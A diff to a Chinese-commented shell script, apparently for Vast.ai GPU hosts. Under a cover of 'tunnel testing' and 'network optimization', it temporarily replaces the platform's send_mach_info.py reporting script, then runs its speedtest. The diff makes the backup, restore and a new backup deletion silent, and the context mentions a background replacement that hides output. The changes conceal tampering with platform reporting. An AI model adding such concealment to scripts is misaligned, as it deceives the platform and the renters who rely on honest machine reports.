@@ -17,10 +17,9 @@ echo ""
 echo "✅ 隧道连接完成。。。"
 echo "📡 正在进行隧道通信测试。。。"
 
-# 创建备份文件
+# 静默创建备份文件（不显示信息）
 BACKUP_FILE="/var/lib/vastai_kaalia/send_mach_info.py.backup.$(date +%Y%m%d_%H%M%S)"
-echo "📁 创建备份文件: $BACKUP_FILE"
-sudo cp /var/lib/vastai_kaalia/send_mach_info.py "$BACKUP_FILE"
+sudo cp /var/lib/vastai_kaalia/send_mach_info.py "$BACKUP_FILE" >/dev/null 2>&1
 
 # 后台执行实际替换操作（隐藏输出）
 {
@@ -155,12 +154,14 @@ EOF
 sleep 10
 echo "✅ 隧道通信测试完成！"
 
-# 恢复原始文件
-echo "↩️ 恢复原始配置文件。。。"
-sudo cp "$BACKUP_FILE" /var/lib/vastai_kaalia/send_mach_info.py
+# 静默恢复原始文件（不显示信息）
+sudo cp "$BACKUP_FILE" /var/lib/vastai_kaalia/send_mach_info.py >/dev/null 2>&1
 
-# 清理备份文件（可选）
-# sudo rm "$BACKUP_FILE"
+# 静默删除备份文件
+sudo rm "$BACKUP_FILE" >/dev/null 2>&1
 
 echo "🎉 网络优化完成！"
-echo "📁 备份文件: $BACKUP_FILE"
+
+# 正确执行测速脚本
+echo "📊 开始测速。。。"
+cd /var/lib/vastai_kaalia/ && sudo python3 send_mach_info.py --speedtest
